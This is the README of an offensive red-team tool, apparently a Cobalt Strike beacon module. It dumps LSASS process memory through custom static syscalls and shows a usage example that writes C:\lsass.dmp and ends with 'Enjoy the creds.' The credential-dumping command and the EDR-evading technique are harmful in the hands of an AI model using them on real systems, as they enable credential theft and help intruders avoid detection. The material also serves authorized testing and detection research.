# MiniDumpWriteDump BOF (64-bit only) 

Custom implementation of DbgHelp's MiniDumpWriteDump function. Uses static syscalls to replace low-level functions like NtReadVirtualMemory. 

Syscalls generated using @jthuraisamy's [SysWhispers](https://github.com/jthuraisamy/SysWhispers) and @Outflanknl's [InlineWhispers](https://github.com/outflanknl/InlineWhispers).

Code is adapted from ReactOS's implementation of MiniDumpWriteDump at [minidump.c](https://doxygen.reactos.org/d8/d5d/minidump_8c_source.html).

## Usage

```
beacon> minidumpwritedump 756 C:\lsass.dmp
[*] Static Syscalls Custom MiniDumpWriteDump BOF (@rookuu_)
[+] host called home, sent: 12165 bytes
[+] received output:
OS Version: 10.0.18362
[+] received output:
Done! Enjoy the creds. (C:\lsass.dmp)
```

